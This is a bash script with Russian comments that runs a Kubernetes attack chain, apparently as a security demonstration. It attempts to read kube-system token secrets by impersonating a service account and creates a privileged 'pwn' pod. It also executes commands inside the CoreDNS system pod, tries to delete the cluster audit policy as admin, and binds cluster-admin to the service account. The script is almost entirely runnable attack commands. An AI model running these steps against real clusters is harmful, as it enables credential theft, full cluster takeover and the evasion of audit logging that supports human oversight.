#!/bin/bash

# Функция для вывода и выполнения команд
run_cmd() {
    echo "> $*"
    "$@"
}

# === НАЧАЛЬНАЯ НАСТРОЙКА СРЕДЫ ===
# Создаем новый namespace для изоляции наших тестовых операций
run_cmd kubectl create ns secure-ops

# Переключаем текущий контекст kubectl на созданный namespace
# Все последующие команды будут выполняться в secure-ops, если не указано иное
run_cmd kubectl config set-context --current --namespace=secure-ops

# === СОЗДАНИЕ ПОТЕНЦИАЛЬНО УЯЗВИМОГО SERVICE ACCOUNT ===
# Создаем service account с именем "monitoring"
# Service accounts используются для аутентификации pod'ов и сервисов
run_cmd kubectl create sa monitoring

# Запускаем pod-"атакующего" с минимальным Alpine Linux образом
# Pod будет спать 3600 секунд (1 час), давая время для тестирования
run_cmd kubectl run attacker-pod --image=alpine --command -- sleep 3600

# === ТЕСТИРОВАНИЕ ПРАВ ДОСТУПА ===
# Проверяем, может ли service account "monitoring" читать секреты
# Это критически важная проверка - доступ к secrets может раскрыть токены, пароли и ключи
run_cmd kubectl auth can-i get secrets --as=system:serviceaccount:secure-ops:monitoring

# === ПОПЫТКА ИЗВЛЕЧЕНИЯ ЧУВСТВИТЕЛЬНЫХ ДАННЫХ ===
# Сложная команда, которая пытается получить token из kube-system namespace:
# 1. Находит первый default-token secret в kube-system
# 2. Извлекает его имя через awk
# 3. Пытается получить содержимое этого secret от имени monitoring service account
# Это симулирует попытку получить доступ к системным токенам
echo "> kubectl get secret -n kube-system \$(kubectl get secrets -n kube-system | grep default-token | head -n1 | awk '{print \$1}') --as=system:serviceaccount:secure-ops:monitoring"
kubectl get secret -n kube-system $(kubectl get secrets -n kube-system | grep default-token | head -n1 | awk '{print $1}') --as=system:serviceaccount:secure-ops:monitoring

# === СОЗДАНИЕ ПРИВИЛЕГИРОВАННОГО POD'А (КРИТИЧЕСКАЯ УЯЗВИМОСТЬ) ===
# Создаем манифест для pod'а с привилегированным доступом
echo "> cat <<EOF | kubectl apply -f - [ТЕКСТ МАНИФЕСТА]"
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: privileged-pod
spec:
  containers:
  - name: pwn
    image: alpine
    command: ["sleep", "3600"]
    securityContext:
      privileged: true  # ОПАСНО! Дает полный доступ к host системе
  restartPolicy: Never
EOF

# === LATERAL MOVEMENT: ДОСТУП К СИСТЕМНЫМ POD'АМ ===
# Выполняем команду внутри CoreDNS pod'а (системный компонент)
# Читаем /etc/resolv.conf для получения информации о DNS настройках
# Это демонстрирует возможность выполнения команд в системных pod'ах
echo "> kubectl exec -n kube-system \$(kubectl get pods -n kube-system | grep coredns | awk '{print \$1}' | head -n1) -- cat /etc/resolv.conf"
kubectl exec -n kube-system $(kubectl get pods -n kube-system | grep coredns | awk '{print $1}' | head -n1) -- cat /etc/resolv.conf

# === ПОПЫТКА НАРУШЕНИЯ АУДИТА ===
# Пытаемся удалить policy аудита от имени admin пользователя
# Это может нарушить логирование и мониторинг безопасности
run_cmd kubectl delete -f /etc/ssl/certs/audit-policy.yaml --as=admin

# === ЭСКАЛАЦИЯ ПРИВИЛЕГИЙ (САМАЯ КРИТИЧЕСКАЯ АТАКА) ===
# Создаем RoleBinding, который дает service account "monitoring"
# полные права cluster-admin во всем кластере
echo "> cat <<EOF | kubectl apply -f -"
cat <<EOF | kubectl apply -f -
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: escalate-binding
subjects:
- kind: ServiceAccount
  name: monitoring
  namespace: secure-ops
roleRef:
  kind: ClusterRole
  name: cluster-admin  # Максимальные права в кластере!
  apiGroup: rbac.authorization.k8s.io
EOF

# === ИТОГ ===
# Скрипт демонстрирует цепочку атак:
# 1. Создание namespace и service account
# 2. Проверка текущих привилегий
# 3. Попытка доступа к системным секретам
# 4. Создание привилегированного контейнера
# 5. Lateral movement к системным pod'ам
# 6. Нарушение аудита
# 7. Финальная эскалация до cluster-admin прав
#
# Каждый шаг представляет реальную угрозу безопасности Kubernetes